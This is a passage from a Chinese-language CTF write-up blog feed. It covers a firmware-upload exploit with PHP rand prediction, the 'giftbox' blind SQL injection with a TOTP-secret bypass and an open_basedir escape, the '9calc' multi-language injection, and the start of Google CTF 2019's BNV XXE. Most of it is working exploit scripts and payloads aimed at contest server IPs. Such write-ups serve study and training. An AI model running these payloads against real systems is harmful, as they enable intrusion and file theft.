class="line">    music += <span class="string">'\x00\x00\x03\x00'</span> + <span class="string">'\x00\x00\x03'</span> + <span class="string">'a'</span> * <span class="number">0x70</span> + <span class="string">'\x00'</span></span><br><span class="line">    files = &#123;<span class="string">'file_data'</span>: music&#125;</span><br><span class="line">    <span class="keyword">if</span> logging: print(url)</span><br><span class="line">    <span class="keyword">if</span> logging: print(data)</span><br><span class="line">    res = post(<span class="number">1</span>, url, data, files)</span><br><span class="line">    <span class="keyword">if</span> logging: print(res.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># n54LuyJyYLVpVO2w</span></span><br><span class="line">            <span class="keyword">return</span> b64decode(json.loads(res.content.strip())[<span class="string">'artist'</span>])[:<span class="number">16</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># upload firmware [diff]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_firmware</span><span class="params">(command)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(command) &gt; <span class="number">0x100</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=firmware'</span></span><br><span class="line">    data = &#123;<span class="string">'file_id'</span>: <span class="string">'0'</span>&#125;</span><br><span class="line">    command = command.ljust(<span class="number">0x100</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    firmware = preset_firmare.replace(<span class="string">'a'</span> * <span class="number">0x100</span>, command)</span><br><span class="line">    files = &#123;<span class="string">'file_data'</span>: firmware&#125;</span><br><span class="line">    <span class="keyword">if</span> logging: print(url)</span><br><span class="line">    <span class="keyword">if</span> logging: print(data)</span><br><span class="line">    res = post(<span class="number">1</span>, url, data, files)</span><br><span class="line">    <span class="keyword">if</span> logging: print(<span class="string">"Upload: "</span> + res.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Date'</span> <span class="keyword">in</span> res.headers.keys():</span><br><span class="line">            print(<span class="string">"Date Header: "</span> + res.headers[<span class="string">'Date'</span>])</span><br><span class="line">            <span class="keyword">return</span> int(datetime.strptime(res.headers[<span class="string">'Date'</span>], <span class="string">"%a, %d %b %Y %X %Z"</span>).strftime(<span class="string">"%s"</span>)) + time_zone_offset</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> int(time.time())</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get firmware version</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">firmware_version</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(path)&gt;<span class="number">0x40</span>: <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    url = site_url + <span class="string">'/hotload.php?page=firmware'</span></span><br><span class="line">    data = &#123;<span class="string">'path'</span>: path&#125;</span><br><span class="line">    <span class="keyword">if</span> logging: print(url)</span><br><span class="line">    <span class="keyword">if</span> logging: print(data)</span><br><span class="line">    res = post(<span class="number">1</span>, url, data)</span><br><span class="line">    <span class="keyword">if</span> logging: print(res.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'"status":1'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> json.loads(res.content.strip())[<span class="string">'info'</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># show result</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_result</span><span class="params">(vuln1, vuln2, msg)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> vuln1 == <span class="number">-1</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: unknown.\n'</span></span><br><span class="line">    <span class="keyword">elif</span> vuln1 == <span class="number">0</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: fail.\n'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: pass.\n'</span></span><br><span class="line">    <span class="keyword">if</span> vuln2 == <span class="number">-1</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: unknown.\n'</span></span><br><span class="line">    <span class="keyword">elif</span> vuln2 == <span class="number">0</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: fail.\n'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: pass.\n'</span></span><br><span class="line">    result += msg</span><br><span class="line">    print(result)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    path = <span class="number">0</span></span><br><span class="line">    vuln1 = <span class="number">-1</span></span><br><span class="line">    vuln2 = <span class="number">-1</span></span><br><span class="line">    logined = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> path == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># username = '1Bq2DT3j'</span></span><br><span class="line">        <span class="comment"># password = 'KWRpkXgHnb'</span></span><br><span class="line">        <span class="comment"># # res = reg(username, password)</span></span><br><span class="line">        <span class="comment"># # if not res: show_result(vuln1, vuln2, 'register fail')</span></span><br><span class="line">        <span class="comment"># res = login(username, password)</span></span><br><span class="line">        <span class="comment"># if not res: show_result(vuln1, vuln2, 'login fail')</span></span><br><span class="line">        <span class="comment"># time.sleep(3)</span></span><br><span class="line">        <span class="comment"># res = upload_music()</span></span><br><span class="line">        <span class="comment"># if res == '':</span></span><br><span class="line">        <span class="comment">#     vuln1 = 0</span></span><br><span class="line">        <span class="comment">#     show_result(vuln1, vuln2, 'leak admin password fail')</span></span><br><span class="line">        admin_password = <span class="string">'Mike84eiNxHcMVCz'</span></span><br><span class="line">        <span class="keyword">global</span> s</span><br><span class="line">        s = requests.session()</span><br><span class="line">        res = login(<span class="string">'admin'</span>, admin_password)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">            vuln1 = <span class="number">0</span></span><br><span class="line">            show_result(vuln1, vuln2, <span class="string">'leak wrong admin password'</span>)</span><br><span class="line">        vuln1 = <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    guess_server_time = upload_firmware(command)</span><br><span class="line">    print(guess_server_time)</span><br><span class="line">    <span class="keyword">if</span> guess_server_time == <span class="number">-1</span>:</span><br><span class="line">        show_result(vuln1, vuln2, <span class="string">'upload fail'</span>)</span><br><span class="line">    vuln2 = <span class="number">0</span></span><br><span class="line">    succ_keyword = <span class="string">'固件版本号：'</span></span><br><span class="line">    <span class="keyword">if</span> vuln2 == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            rander = php_rand(guess_server_time - i)</span><br><span class="line">            <span class="comment"># path = hashlib.md5(str(rander.rand()) + '182.91.145.76').hexdigest()</span></span><br><span class="line">            path = hashlib.md5(str(rander.rand()) + <span class="string">'39.108.249.224'</span>).hexdigest()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                prev_flag = firmware_version(path).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> succ_keyword <span class="keyword">in</span> prev_flag:</span><br><span class="line">                vuln2 = <span class="number">1</span></span><br><span class="line">                prev_flag = prev_flag.replace(succ_keyword, <span class="string">''</span>).strip()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    show_result(vuln1, vuln2, prev_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(argv) != <span class="number">3</span>:</span><br><span class="line">        print(<span class="string">"wrong params."</span>)</span><br><span class="line">        print(<span class="string">"example: python %s %s %s"</span> % (argv[<span class="number">0</span>], <span class="string">'127.0.0.1'</span>, <span class="string">'80'</span>))</span><br><span class="line">        exit()</span><br><span class="line">    ip = argv[<span class="number">1</span>]</span><br><span class="line">    port = int(argv[<span class="number">2</span>])</span><br><span class="line">    site_url = <span class="string">'http://%s:%d'</span> % (ip, port)</span><br><span class="line">    get_flag()</span><br></pre></td></tr></table></figure><p>PS: 注意时区问题</p><h2 id="0x04-giftbox"><a href="#0x04-giftbox" class="headerlink" title="0x04 giftbox"></a>0x04 giftbox</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>送给小蛮腰的礼物，她是一位美丽的姑娘。</p><p>A gift for Canton Tower, a pretty girl.</p><h3 id="题目解答-3"><a href="#题目解答-3" class="headerlink" title="题目解答"></a>题目解答</h3><p>PS: 这个樱花真好看，上去就先保存了，哈哈</p><ol><li>看<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://222.85.25.41:8090/js/</span><br></pre></td></tr></table></figure></li></ol><p>知道pyotp.zip和&gt;totp.min.js是采用了双因子认证</p><ol start="2"><li><p>得到关于双因子认证的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://222.85.25.41:8090/js/main.js</span><br></pre></td></tr></table></figure></li><li><p>login处登录注入得到账号密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    get_data()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(payload)</span>:</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(<span class="string">'http://222.85.25.41:8090/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>, <span class="string">'totp'</span>: totp.now()&#125;,</span><br><span class="line">                      data=&#123;<span class="string">'dir'</span>: <span class="string">'/'</span>, <span class="string">'pos'</span>: <span class="string">'/'</span>, <span class="string">'filename'</span>: <span class="string">'usage.md'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print('login admin\'/**/and/**/(' + payload + ')/**/and/**/\'1\'=\'1 admin')</span></span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># db_nums_payload = "select/**/count(*)/**/from/**/user"</span></span><br><span class="line">    <span class="comment"># db_numbers = half(db_nums_payload)</span></span><br><span class="line">    <span class="comment"># print("长度为：%d" % db_numbers)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># db_data = "select/**/version()"</span></span><br><span class="line">    <span class="comment"># db_data = "select/**/database()"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="comment"># db_data = "SELECT/**/table_name/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=\'giftbox\'/**/LIMIT/**/&#123;&#125;,1".format(</span></span><br><span class="line">        <span class="comment">#     i)</span></span><br><span class="line">        <span class="comment"># db_data = "SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=\'giftbox\'/**/and/**/table_name=\'users\'/**/LIMIT/**/&#123;&#125;,1".format(</span></span><br><span class="line">        <span class="comment">#     i)</span></span><br><span class="line">        db_data = <span class="string">"select/**/password/**/from/**/giftbox.users/**/limit/**/&#123;&#125;,1"</span>.format(</span><br><span class="line">            i)</span><br><span class="line">        db_name = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">            db_name_payload = <span class="string">"ascii(substr(("</span> + db_data + <span class="string">"),%d,1))"</span> % (</span><br><span class="line">                y)</span><br><span class="line">            db_name += chr(half(db_name_payload))</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"&gt; "</span> + db_name)</span><br><span class="line">        <span class="keyword">if</span> db_name == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span><span class="params">(payload)</span>:</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="comment"># print(standard_html)</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">"%s/**/&gt;/**/%d"</span> % (payload, mid)</span><br><span class="line">        <span class="comment"># print(mid_num_payload)</span></span><br><span class="line">        <span class="comment"># print(mid_html)</span></span><br><span class="line">        <span class="keyword">if</span> http_get(mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = int((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">当前数据库：giftbox</span><br><span class="line">数据库中的表：users</span><br><span class="line">表中的列：</span><br><span class="line">值：id</span><br><span class="line">值：username</span><br><span class="line">值：password</span><br><span class="line">列中的数据：</span><br><span class="line">username值：admin</span><br><span class="line">password值：hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br></pre></td></tr></table></figure><p>之后使用如下命令登录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br></pre></td></tr></table></figure></p><ol start="4"><li>bypass open_basedir</li></ol><p>参考：<a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a></p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&apos;css&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);echo(file_get_contents(&apos;flag&apos;));</span><br></pre></td></tr></table></figure></p><p>根据这个受限的shell，发现是要对上面的payload进行切分，而且此处过滤了很多字符。此处可以使用如下<a href="https://github.com/zer0yu/Berserker/blob/287246f133c22d35dca9af844f8f399d16445713/webfuzz-general/misc/alphanum_case_extra.txt" target="_blank" rel="noopener">fuzz字典</a>来对那些值被过滤了进行fuzz，测试完之后就可以构造拼接了。</p><p>先看目前的路径以及需要向外跳几次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">targeting p print_r</span><br><span class="line">targeting v getcwd</span><br><span class="line">targeting w $n</span><br><span class="line">targeting x &#123;$p($v())&#125;</span><br><span class="line">launch</span><br></pre></td></tr></table></figure></p><p>确认完是两层后构造payload直接打就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">targeting a chdir</span><br><span class="line">targeting b css</span><br><span class="line">targeting c &#123;$a($b)&#125;</span><br><span class="line">targeting d ini_set</span><br><span class="line">targeting e open_basedir</span><br><span class="line">targeting f ..</span><br><span class="line">targeting g &#123;$d($e,$f)&#125;</span><br><span class="line">targeting h &#123;$a($f)&#125;</span><br><span class="line">targeting i &#123;$a($f)&#125;</span><br><span class="line">targeting j base64_</span><br><span class="line">targeting k decode</span><br><span class="line">targeting l $j$k</span><br><span class="line">targeting m Ly8v</span><br><span class="line">targeting n &#123;$l($m)&#125;</span><br><span class="line">targeting o &#123;$d($e,$n)&#125;</span><br><span class="line">targeting p print_r</span><br><span class="line">targeting q file_get_</span><br><span class="line">targeting r contents</span><br><span class="line">targeting s $q$r</span><br><span class="line">targeting t flag</span><br><span class="line">targeting u &#123;$p($s($t))&#125;</span><br><span class="line">launch</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/11/4uC2VS1iWqpwMOE.png" alt="屏幕快照 2019-08-05 上午8.52.53.png"><br>PS: 其实那天晚上就出了，但是被这个界面回显给整蒙了, emmmmmm</p><h2 id="0x05-9calc"><a href="#0x05-9calc" class="headerlink" title="0x05 9calc"></a>0x05 9calc</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>calcalcalc again and again…</p><p>9-calc-eposide.3</p><h3 id="题目解答-4"><a href="#题目解答-4" class="headerlink" title="题目解答"></a>题目解答</h3><p>参考wp:<a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/calcalcalc-family" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/calcalcalc-family</a></p><p>EXP:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line"><span class="keyword">const</span> url = <span class="string">'http://45.77.242.16/calculate'</span></span><br><span class="line"><span class="keyword">const</span> symbols = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;_'</span>.split(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> payloads = [</span><br><span class="line"><span class="comment">// Nodejs</span></span><br><span class="line"><span class="string">`1 + 0//5 or '''\n//?&gt;\nrequire('fs').readFileSync('/flag','utf-8')[&#123;index&#125;] == '&#123;symbol&#125;' ? 1 : 2;/*&lt;?php\nfunction open()&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; '1']);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// Python</span></span><br><span class="line"><span class="string">`(open('/flag').read()[&#123;index&#125;] == '&#123;symbol&#125;') + (str(1//5) == 0) or 2 or ''' #\n))//?&gt;\nfunction open()&#123;return &#123;read:()=&gt;'&#123;flag&#125;'&#125;&#125;function str()&#123;return 0&#125;/*&lt;?php\nfunction open()&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; '1']);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP</span></span><br><span class="line"><span class="string">`len('1') + 0//5 or '''\n//?&gt;\n1;function len()&#123;return 1&#125;/*&lt;?php\nfunction len($a)&#123;echo MongoDB\\BSON\\fromPHP(['ret' =&gt; file_get_contents('/flag')[&#123;index&#125;] == '&#123;symbol&#125;' ? "1" : "2"]);exit;&#125;?&gt;*///'''`</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> rets = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> checkAnswer = <span class="function">(<span class="params">value</span>) =&gt;</span> axios.post(url, &#123;</span><br><span class="line">expression: &#123;</span><br><span class="line">value,</span><br><span class="line">_bsontype: <span class="string">"Symbol"</span></span><br><span class="line">&#125;,</span><br><span class="line">isVip: <span class="literal">true</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">p</span> =&gt;</span> p.data.ret === <span class="string">'1'</span>).catch(<span class="function"><span class="params">e</span> =&gt;</span> &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fn = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; payloads.length; j++) &#123;</span><br><span class="line"><span class="keyword">const</span> payload = payloads[j]</span><br><span class="line"><span class="keyword">let</span> flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; symbols.length; i++) &#123;</span><br><span class="line"><span class="keyword">const</span> ret = <span class="keyword">await</span> checkAnswer(payload.replace(<span class="regexp">/\&#123;flag\&#125;/g</span>, flag + symbols[i]).replace(<span class="regexp">/\&#123;symbol\&#125;/g</span>, symbols[i]).replace(<span class="regexp">/\&#123;index\&#125;/g</span>, index))</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">flag += symbols[i]</span><br><span class="line"><span class="built_in">console</span>.log(symbols[i])</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">index++</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">rets.push(flag)</span><br><span class="line"><span class="built_in">console</span>.log(rets)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn().then(<span class="function"><span class="params">p</span> =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(rets.join(<span class="string">''</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/11/KlW7ixLXV2k6ytw.png" alt="E236064C-3473-4B00-9F7E-0DA18A9D3A58.png"></p><p>PS: 这个系列随后得再review一下</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在家宅着不想写wp，来学第一天补上&lt;/p&gt;
&lt;h2 id=&quot;0x01-SSRF-Me&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Google Capture The Flag 2019 (Quals) WP</title>
    <link href="http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/"/>
    <id>http://zer0yu.github.io/2019/07/18/Google-Capture-The-Flag-2019/</id>
    <published>2019-07-18T08:44:53.000Z</published>
    <updated>2019-08-10T12:58:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>写篇复盘的小水文<br>文章首发在合天公众号，转载请注意</p><h2 id="0x01-BNV"><a href="#0x01-BNV" class="headerlink" title="0x01 BNV"></a>0x01 BNV</h2><p>题目描述：</p><p>There is not much to see in this enterprise-ready™ web application.</p><p>题目地址：</p><p><a href="https://bnv.web.ctfcompetition.com/" target="_blank" rel="noopener">https://bnv.web.ctfcompetition.com/</a></p><p>题目解答：</p><p>burp抓包发现传输json数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /api/search HTTP/1.1</span><br><span class="line">Host: bnv.web.ctfcompetition.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://bnv.web.ctfcompetition.com/</span><br><span class="line">Content-type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>联想到json转换为xxe进行文件读取，首先为了验证猜想直接修改HTTP头Content-type的值为application/xml，重放数据包之后发现报不解析错误，确认了猜想。</p><p><img src="https://i.loli.net/2019/07/18/5d3030f30ebe260056.png" alt="83EA2441-2660-437B-8AA6-38E1D4EA37B3.png"></p><p>手动把json转换为xxe格式，发现报错说缺少DTD<br><img src="https://i.loli.net/2019/07/18/5d3031174d49928141.png" alt="39377EB4-BF43-4221-9B68-C6AC640C350A.png"></p><p>想到之前看到的一个点<a href="https://www.freebuf.com/articles/web/195899.html" target="_blank" 